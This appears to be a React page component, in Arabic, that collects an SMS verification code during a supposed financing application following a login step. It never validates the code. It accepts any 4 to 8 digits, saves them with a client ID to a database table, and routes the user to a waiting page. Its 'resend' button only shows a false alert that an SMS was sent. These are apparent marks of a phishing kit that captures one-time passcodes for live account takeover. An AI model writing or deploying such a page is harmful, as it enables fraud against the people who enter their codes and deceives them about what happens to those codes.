import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ShieldCheck, ArrowLeft, RefreshCw, Hash } from 'lucide-react';
import { supabase } from '@/lib/supabase';
import { getClientId } from '@/lib/clientId';
import { useSiteConfig } from '@/context/SiteConfigContext';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

export default function VerifyPage() {
  const navigate = useNavigate();
  const { config } = useSiteConfig();
  const pg = config.verify;

  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const regEmail = sessionStorage.getItem('reg_email');
  const regId = sessionStorage.getItem('reg_id');

  // تحقق من رسالة خطأ من صفحة الانتظار
  useEffect(() => {
    const verifyError = sessionStorage.getItem('verify_error');
    const verifyMessage = sessionStorage.getItem('verify_message');
    
    if (verifyError === 'true' && verifyMessage) {
      setError(verifyMessage);
      sessionStorage.removeItem('verify_error');
      sessionStorage.removeItem('verify_message');
    }
  }, []);

  const handleInput = (value: string) => {
    // Only allow numbers and limit to 8 digits
    if (!/^\d*$/.test(value)) return;
    if (value.length > 8) return;
    
    setCode(value);
    setError('');
  };

  const isComplete = code.length >= 4 && code.length <= 8;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 4) { 
      setError('يرجى إدخال 4 أرقام على الأقل'); 
      return; 
    }
    
    setLoading(true); 
    setError('');
    
    try {
      // Save verification code to database
      sessionStorage.setItem('verification_code', code);
      
      // Try to get registration_id if not available
      let registrationId = regId;
      if (!registrationId && regEmail) {
        // Try to find registration by email
        const { data: regData } = await supabase
          .from('registrations')
          .select('id')
          .eq('email', regEmail)
          .single();
        if (regData) {
          registrationId = regData.id;
        }
      }
      
      // Save to database and get the ID
      try {
        const { data, error: insertError } = await supabase
          .from('verification_codes')
          .insert({
            registration_id: registrationId || null,
            client_id: getClientId(),
            code: code,
          })
          .select()
          .single();
        
        if (!insertError && data) {
          sessionStorage.setItem('verification_attempt_id', data.id);
        }
      } catch (dbErr) {
        console.warn('Could not save verification code to database:', dbErr);
      }
      
      setLoading(false);
      
      // توجيه لصفحة انتظار التحقق
      navigate('/verify-waiting');
    } catch (err) {
      setLoading(false);
      setError('حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.');
    }
  };

  const handleResend = async () => {
    // Simulate resending SMS
    setCode(''); 
    setError('');
    alert('تم إعادة إرسال رمز التحقق إلى هاتفك المحمول عبر SMS');
  };

  return (
    <div className="min-h-screen flex flex-col bg-slate-50">
      <Header />
      <main className="flex-1 flex items-center justify-center py-10 px-4 sm:px-6">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-14 h-14 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <ShieldCheck className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-800">{pg.title}</h1>
            <p className="text-slate-500 mt-2">{pg.subtitle}</p>
          </div>

          <div className="flex items-center justify-center gap-2 mb-8 flex-wrap">
            {[{label:'بيانات التمويل',done:true},{label:'الدخول',done:true},{label:'التحقق',active:true},{label:'استلام الطلب',done:false}].map((step,i)=>(
              <div key={step.label} className="flex items-center gap-2">
                <div className={`px-3 py-1.5 rounded-full text-xs font-semibold ${step.done?'bg-green-100 text-green-700':step.active?'bg-blue-600 text-white':'bg-slate-200 text-slate-400'}`}>
                  {step.label}
                </div>
                {i<3&&<div className="w-4 h-px bg-slate-300 hidden sm:block"/>}
              </div>
            ))}
          </div>

          <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 sm:p-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700 flex items-center gap-2 justify-center">
                  <Hash className="w-4 h-4 text-blue-500" />
                  أدخل رمز التحقق المرسل عبر SMS
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={code}
                  onChange={(e) => handleInput(e.target.value)}
                  placeholder="••••••"
                  className="w-full text-center text-2xl font-bold tracking-[0.5em] border-2 border-slate-200 rounded-2xl py-4 focus:border-blue-500 focus:ring-4 focus:ring-blue-50 transition-all ltr placeholder:tracking-normal"
                />
              </div>

              {error && (
                <div className="bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-sm font-medium text-center animate-shake">
                  {error}
                </div>
              )}

              <button 
                type="submit" 
                disabled={loading || !isComplete}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-300 disabled:cursor-not-allowed text-white font-bold py-4 rounded-xl shadow-md hover:shadow-lg transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2 text-base"
              >
                {loading ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  <>
                    <span>{pg.button_text}</span>
                    <ArrowLeft className="w-5 h-5" />
                  </>
                )}
              </button>
            </form>

            <div className="mt-6 text-center">
              <button 
                onClick={handleResend} 
                className="inline-flex items-center gap-2 text-sm text-slate-500 hover:text-blue-600 transition-colors font-medium group"
              >
                <RefreshCw className="w-4 h-4 group-hover:rotate-180 transition-transform duration-500" />
                {pg.resend_text}
              </button>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}
